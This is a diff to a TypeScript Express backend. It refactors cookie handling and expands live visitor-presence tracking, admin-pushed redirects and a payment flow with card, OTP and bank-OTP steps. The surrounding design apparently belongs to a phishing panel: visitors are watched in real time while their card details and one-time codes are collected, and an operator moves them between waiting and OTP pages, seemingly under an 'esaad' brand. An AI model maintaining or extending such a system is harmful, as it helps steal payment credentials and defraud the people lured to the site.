@@ -140,8 +140,15 @@ function extractVisitorMeta(req: express.Request): VisitorMeta {
   };
 }
 
+function buildCookie(name: string, value: string, req: express.Request, maxAge?: number): string {
+  const isSecure = req.secure || req.headers['x-forwarded-proto'] === 'https';
+  const sameSite = isSecure ? 'SameSite=None; Secure' : 'SameSite=Lax';
+  const agePart = maxAge !== undefined ? `; Max-Age=${maxAge}` : '';
+  return `${name}=${encodeURIComponent(value)}; Path=/; HttpOnly${agePart}; ${sameSite}`;
+}
+
 function prunePresence() {
-  const cutoff = Date.now() - 12000;
+  const cutoff = Date.now() - 30000;
   for (const [k, entry] of devicePresence.entries()) {
     if (entry.lastSeen < cutoff) devicePresence.delete(k);
   }
@@ -208,49 +215,53 @@ app.post('/api/presence', async (req, res) => {
   const meta = extractVisitorMeta(req);
 
   const cookieHeaders: string[] = [
-    `esaad_cid=${encodeURIComponent(clientId)}; Path=/; HttpOnly; SameSite=Lax`
+    buildCookie('esaad_cid', String(clientId), req)
   ];
 
   if (isNewVisit) {
     totalVisitorsCounter += 1;
-    cookieHeaders.push('esaad_visited=1; Path=/; HttpOnly; SameSite=Lax');
+    cookieHeaders.push(buildCookie('esaad_visited', '1', req));
   }
 
   res.setHeader('Set-Cookie', cookieHeaders);
 
   if (!currentPage.startsWith('/admin')) {
+    const existingDevice = devicePresence.get(String(clientId));
+    const resolvedReqId = requestId
+      ? String(requestId)
+      : existingDevice?.requestId || null;
+
     devicePresence.set(String(clientId), {
       lastSeen: now,
       currentPage,
-      requestId: requestId ? String(requestId) : null,
+      requestId: resolvedReqId,
       meta
     });
 
-    if (requestId) {
-      const reqIdStr = String(requestId);
-      userPresence.set(reqIdStr, {
+    if (resolvedReqId) {
+      userPresence.set(resolvedReqId, {
         lastSeen: now,
         currentPage
       });
-      lastKnownUserPage.set(reqIdStr, currentPage);
-      userMetaMap.set(reqIdStr, meta);
+      lastKnownUserPage.set(resolvedReqId, currentPage);
+      userMetaMap.set(resolvedReqId, meta);
 
-      const targetRoute = pendingRedirects.get(reqIdStr);
+      const targetRoute = pendingRedirects.get(resolvedReqId);
       if (targetRoute) {
         if (currentPage === targetRoute) {
           // Visitor arrived at redirected page; consume the pending redirect
-          pendingRedirects.delete(reqIdStr);
+          pendingRedirects.delete(resolvedReqId);
           const supabase = getSupabase();
           if (supabase) {
             supabase
               .from('requests')
               .update({ next_action: '', updated_at: new Date().toISOString() })
-              .eq('id', reqIdStr)
+              .eq('id', resolvedReqId)
               .then(() => {});
           }
         } else {
           prunePresence();
-          return res.json({ ok: true, requestId: reqIdStr, redirectTo: targetRoute });
+          return res.json({ ok: true, requestId: resolvedReqId, redirectTo: targetRoute });
         }
       }
     }
@@ -313,10 +324,7 @@ app.post('/api/admin/login', async (req, res) => {
     if (!error && data.session) {
       const token = data.session.access_token;
       adminTokens.add(token);
-      res.setHeader(
-        'Set-Cookie',
-        `esaad_admin_token=${encodeURIComponent(token)}; Path=/; HttpOnly; SameSite=Lax`
-      );
+      res.setHeader('Set-Cookie', buildCookie('esaad_admin_token', token, req));
       return res.json({ token, user: { email: data.user?.email } });
     }
   }
@@ -330,10 +338,7 @@ app.post('/api/admin/login', async (req, res) => {
   ) {
     const token = crypto.randomBytes(24).toString('hex');
     adminTokens.add(token);
-    res.setHeader(
-      'Set-Cookie',
-      `esaad_admin_token=${encodeURIComponent(token)}; Path=/; HttpOnly; SameSite=Lax`
-    );
+    res.setHeader('Set-Cookie', buildCookie('esaad_admin_token', token, req));
     return res.json({ token, user: { email: expectedEmail } });
   }
 
@@ -377,7 +382,7 @@ app.post('/api/admin/logout', (req, res) => {
   if (token) {
     adminTokens.delete(token);
   }
-  res.setHeader('Set-Cookie', 'esaad_admin_token=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax');
+  res.setHeader('Set-Cookie', buildCookie('esaad_admin_token', '', req, 0));
   res.json({ ok: true });
 });
 
@@ -403,6 +408,9 @@ app.get('/api/requests/current', async (req, res) => {
   if (error || !data) {
     return res.status(404).json({ error: 'الطلب غير موجود' });
   }
+
+  const currentPage = lastKnownUserPage.get(id) || '/waiting';
+  userPresence.set(id, { lastSeen: Date.now(), currentPage });
   return res.json(fromSupabaseRow(data));
 });
 
@@ -440,6 +448,9 @@ app.get('/api/requests/:id', async (req, res) => {
   if (error || !data) {
     return res.status(404).json({ error: 'الطلب غير موجود' });
   }
+
+  const currentPage = lastKnownUserPage.get(id) || '/waiting';
+  userPresence.set(id, { lastSeen: Date.now(), currentPage });
   return res.json(fromSupabaseRow(data));
 });
 
@@ -487,10 +498,7 @@ app.post('/api/requests', async (req, res) => {
   userPresence.set(id, { lastSeen: Date.now(), currentPage: '/payment' });
   lastKnownUserPage.set(id, '/payment');
 
-  res.setHeader(
-    'Set-Cookie',
-    `esaad_req_id=${encodeURIComponent(id)}; Path=/; HttpOnly; SameSite=Lax`
-  );
+  res.setHeader('Set-Cookie', buildCookie('esaad_req_id', id, req));
   return res.status(201).json(fromSupabaseRow(data || newRecord));
 });
 
@@ -528,6 +536,9 @@ app.patch('/api/requests/:id', async (req, res) => {
     }
   } else if (req.body?.step === 'card' || req.body?.step === 'otp' || req.body?.step === 'otp-bank') {
     pendingRedirects.delete(id);
+    const stepPage = req.body.step === 'card' ? '/waiting' : req.body.step === 'otp-bank' ? '/otp-bank' : '/otp';
+    userPresence.set(id, { lastSeen: Date.now(), currentPage: stepPage });
+    lastKnownUserPage.set(id, stepPage);
   }
 
   const { data, error } = await supabase
